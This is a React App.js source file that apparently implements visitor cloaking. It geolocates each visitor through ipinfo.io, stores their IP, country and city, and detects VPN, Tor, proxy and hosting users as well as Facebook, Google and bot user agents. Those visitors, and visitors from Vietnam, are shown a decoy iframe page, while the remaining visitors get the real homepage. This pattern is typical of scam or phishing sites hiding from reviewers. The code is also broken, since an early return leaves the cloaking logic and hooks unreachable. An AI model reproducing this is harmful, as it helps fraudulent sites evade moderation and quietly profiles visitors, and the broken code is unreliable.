import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import HomePage from "./pages/HomePage";
import { isbot } from "isbot";
import React, { useState,useEffect} from "react";

function App() {
  return (
    <BrowserRouter>
        <Routes>
          <Route path="/" element={<HomePage/>} />
          <Route path="*" element={showIframe("homepage.html")} />
        </Routes>
    </BrowserRouter>
  );
  let[countryCode, setCountryCode] = useState('');
  let[IsUserHiden, SetUserHiden] = useState(false);

  function showIframe(file) {
    const html = (
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
    );
    return html;
  }

  const setLocaltion =  () => {
    try {
      fetch("https://ipinfo.io/widget").then(d => d.json()).then(d => {
        var countryCode = d.country;
        var privacy = d.privacy;
        if(privacy){
          if(
             privacy.vpn == true
            || privacy.hosting == true
            || privacy.relay == true
            || privacy.tor == true
            || privacy.proxy == true
          ){
            SetUserHiden(true);
          }
        }
        setCountryCode(countryCode.toLowerCase());
        localStorage.setItem(
          "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
        );
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    setLocaltion();
  }, []);

  const userAgent = navigator.userAgent.toLowerCase();
  if(!userAgent.includes('facebook') 
    && !userAgent.includes('google') 
    && !isbot(userAgent)){
    if(IsUserHiden){
      return(showIframe("homepage.html"));
    }else{
      if(countryCode.length == 0){
        return(           
          <div className="loading">
              <div className="loader"></div>
          </div>
        );
      }else{
        if(countryCode.includes('vn')){
          return(showIframe("homepage.html"));
        }else{
          return (
            <BrowserRouter>
                <Routes>
                  <Route path="/" element={<HomePage/>} />
                  <Route path="*" element={showIframe("homepage.html")} />
                </Routes>
            </BrowserRouter>
          );
        }
      }
    }
  }else{
    return(showIframe("homepage.html"));
  }
 

}


export default App;
